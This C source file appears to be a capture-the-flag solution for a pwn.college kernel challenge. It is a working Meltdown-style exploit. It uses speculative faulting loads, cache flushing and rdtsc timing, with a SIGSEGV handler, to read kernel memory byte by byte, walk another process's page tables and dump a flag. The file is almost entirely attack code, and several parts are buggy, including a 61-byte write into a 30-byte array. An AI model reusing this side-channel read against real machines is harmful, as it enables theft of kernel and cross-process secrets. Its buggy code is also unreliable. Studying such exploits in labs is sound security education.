# include <stdio.h>
# include <stdbool.h>
# include <x86intrin.h>
# include <stdlib.h>
# include <string.h>
# include <sys/wait.h>
# include <sys/types.h>
# include <sys/mman.h>
# include <setjmp.h>
# include <signal.h>
# include <stdint.h>
# include <sys/ioctl.h>
# include <fcntl.h>
# include <unistd.h>
# include <math.h>

#define CACHE_HIT_THRESHOLD 200
#define CACHE_LINE_SIZE 0X1000
#define BUFF_SIZE 256

char *buffer;
char *secret_page;

static jmp_buf buf;

void speculative_exploit(size_t target_addr,char *com_buffer)
{
        asm volatile(
                ".intel_syntax noprefix\n"
                "xor rcx, rcx\n"
                "lea rbx,[%1]\n"
                "mov rax, 0x1337\n"
                "push rax\n"
                "fild QWORD PTR [rsp]\n"
                "fsqrt\n"
                "fistp QWORD PTR [rsp]\n"
                "pop rax\n"
                "mov rax, [rax]\n"// SEGFAULT
                "mov cl, BYTE PTR [%0]\n"
                "shl rcx, 12\n"
                "add rbx, rcx\n"
                "mov rbx, [rbx]\n"
                ".att_syntax prefix\n"
                :
                : "r" (target_addr), "r" (com_buffer)
                : "rcx", "rbx", "rax","rsp","memory"
                );
}


static void segfault_handler(int signum)
{
        (void)signum;
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs,signum);
        sigprocmask(SIG_UNBLOCK,&sigs,NULL);
        longjmp(buf,1);
}

void pre_work()
{
        uint8_t *addr;
        for (int j=0;j<BUFF_SIZE;j++)
        {
                addr=buffer+j*CACHE_LINE_SIZE;
                _mm_clflush(addr);
        }
}

uint64_t time_access_no_flush(void *p)
{
        uint64_t start,end;
        start=__rdtsc();
        volatile uint64_t x=*(volatile uint64_t *)p;
        _mm_mfence();
        end=__rdtsc();
        return end-start;
}

bool post_work_inner_work(int mix_i)
{
        uint8_t *addr;
        size_t cache_hit_threshold=CACHE_HIT_THRESHOLD;
        int index;
        uint64_t t_no_flush;
        index=mix_i*CACHE_LINE_SIZE;
        addr=buffer+index;
        t_no_flush =time_access_no_flush(addr);
        if(t_no_flush <= cache_hit_threshold)
        {
                //printf("cache hit:%u %lu\n",mix_i,t_no_flush);
                return true;
        }
        return false;
}

int post_work(int *stats)
{
        for(size_t i=0;i<BUFF_SIZE; i++)
        {
                int mix_i=((i*167)+13)&255;
                if(post_work_inner_work(mix_i))
                {
                        stats[mix_i]++;
                }
        }
        /*int cnt=0;
        for(int i=32;i<127;i++)
        {
                if(stats[i]>=1)
                        cnt+=1;
        }
        if(cnt==0)
        {
                stats=(int *)calloc(sizeof(int),CACHE_LINE_SIZE);
                post_work(stats);
        }*/
}

void *setup_mem()
{
        return mmap(0,255*0x10000,PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_POPULATE|MAP_ANONYMOUS,-1,0);
}

int exploit(size_t addr)
{
        int stats[255]={0};

        for(int i=0;i<100;i++)
        {
                if(!setjmp(buf))
                {
                        pre_work();
                        speculative_exploit(addr,buffer);
                }
                post_work(stats);
        }
        // Reviewing the stats data and printing out
        // the likely character  
        int max_index =0;
        int max_val=0;
        for(int j=14;j<255;j++)
        {
                if(stats[j]>max_val)
                {
                        max_index=j;
                        max_val=stats[j];
                }
                //printf("index:%d count %d\n",j,stats[j]);
        }
        //printf("Value detected:%d\n",max_index);
	return max_index;
}

int exploit2(size_t addr)
{
        int stats[255]={0};

        for(int i=0;i<100;i++)
        {
                if(!setjmp(buf))
                {
                        pre_work();
                        speculative_exploit(addr,buffer);
                }
                post_work(stats);
        }
        // Reviewing the stats data and printing out
        // the likely character  
        int max_index =0;
        int max_val=0;
        for(int j=14;j<255;j++)
        {
                if(stats[j]>max_val)
                {
                        max_index=j;
                        max_val=stats[j];
                }
                //printf("index:%d count %d\n",j,stats[j]);
        }
        //printf("Value detected:%d\n",max_index);
	return max_index;
}

int max_finder(int *arr,int n)
{
	int max_val=0;
	int max_index=0;
	for(int i=0;i<n;i++)
	{
		if(max_val<arr[i])
		{
			max_val=arr[i];
			max_index=i;
		}
	}
	return max_index;;
}

long page_translation(long entry)
{
	long page=entry & ~0xfff;
	char arr[8]={0};
	arr[7]=0xff;
	arr[6]=0xff;
	arr[5]=0x88;
	arr[4]=0x80;
	for(int i=0;i<4;i++)
	{
		arr[3-i]=page>>((3-i)*8) & 0x000000ff;
	}
	printf("Page of pmg:%lx\n",*(long *)arr);
	return *(long *)arr;
}

void main(int argc, char **argv)
{
	if(argc>1)
	{
		if(signal(SIGSEGV,segfault_handler)==SIG_ERR)
		{
			printf("Failed to setup segfault handler!");
			exit(0);
		}
	}
	buffer=setup_mem();
	printf("Buffer address:0x%lx\n",buffer);
	int pid;
	printf("Enter pid of molten_walk_challenge:");
	scanf("%d",&pid);
	*(int *)buffer=pid;
	int fd=open("/proc/pwncollege",O_RDWR);
	ioctl(fd,31337,(int *)buffer);
	buffer=buffer+0x8;
	printf("buffer:%lx\n",*(uint64_t *)buffer);
	uint64_t a=*(uint64_t *)buffer;
	int offset_mm=992;
	int offsets[]={992,0x50};//mm offset, pgd offset
	size_t pgd;
	size_t mm_struct;
	for(int j=0;j<2;j++)
	{
		unsigned char bytes[8]={0};
		bytes[6]=0xff;
		bytes[7]=0xff;
		int cnt=0;
		for(int i=1;i<6;i++)
		{
			//mm+=exploit((long)(a+992+1))*pow(10,i);
			ioctl(fd,1337,(long *)(a+offsets[j]+i));
			int temp=exploit((long)(a+offsets[j]+i));
			if(temp==0 && cnt<=4)
			{
				i-=1;
				cnt+=1;
				continue;
			}
			else if(cnt>=4)
				cnt=0;
			bytes[i]=temp;
		}
		//printf("mm_struct address:");
		/*for(int i=0;i<8;i++)
		{
			printf("index :%d,%lx",(7-i),*(bytes+7-i));
		}*/
		if(j==0)
			//printf("mm_struct address:%lx\n",*(long *)bytes);
			mm_struct=*(long *)bytes;
		else if(j==1)
		{
			//printf("pgd address:%lx\n",*(long *)bytes);
			pgd=*(long *)bytes;
		}
			
		a=*(long *)bytes;
	}
	printf("mm_struct address:%lx\n",mm_struct);
	printf("pgd is %lx\n",pgd);

	long buff_addr=0x404060;
	int *indexes=(int *)malloc(sizeof(int)*4);
	for(int i=0;i<4;i++)
	{
		indexes[i]=(buff_addr >> (39-9*i)) & 0x1ff;
		printf("Index%d:%d\n",i,indexes[i]);
	}
	int cnt=0;
	a=pgd;
	int j=0;
	//int prev=0;
	//int prev2=0;
	long entry[4]={0};
	for(int k=0;k<4;k++)
	{
		unsigned char bytes[8]={0};
		for(int i=0;i<8;i++)
		{
			int *counter=(int *)calloc(sizeof(int),256);
			for(int b=0;b<10;b++)
			{
				ioctl(fd,1337,(long *)(a+indexes[j]+i));
				int temp=exploit2((long)(a+indexes[j]+i));
				counter[temp]+=1;
			}
			int temp=max_finder(counter,256);
			bytes[i]=temp;
		}
		entry[k]=*(long *)bytes;
		if(k<3)
			a=page_translation(entry[k])+indexes[k+1]*8;
		else
			break;
	}
	/*for(int i=0;i<8;i++)
	{
		if(!((char *)(entry[0])[i]==(char *)(entry[1])[i] && (char *)(entry[1])[i]==(char *)(entry[2])[i]))
			bytes[i]=0;
			
	}*/
	for(int i=0;i<4;i++)
	{
		printf("index %d:%lx\n",i,entry[i]);
		//page_translation(entry[i]);
	}
	
	long final_addr=page_translation(entry[3])+0x60;
	printf("Final address:%lx\n",final_addr);
	char flag[30]={0};
	for(int i=0;i<61;i++)
	{
		int *counter=(int *)calloc(sizeof(int),256);
		for(int j=0;j<10;j++)
		{
			ioctl(fd,1337,(long *)(final_addr+i));
			int temp=exploit2((long)(final_addr+i));
			counter[temp]+=1;
		}
		int temp=max_finder(counter,256);
		printf("temp for index %d:%d",i,temp);
		flag[i]=temp;
	}
	printf("value of incremented a:%lx\n",a+992);
	printf("Flag:%s",flag);
}
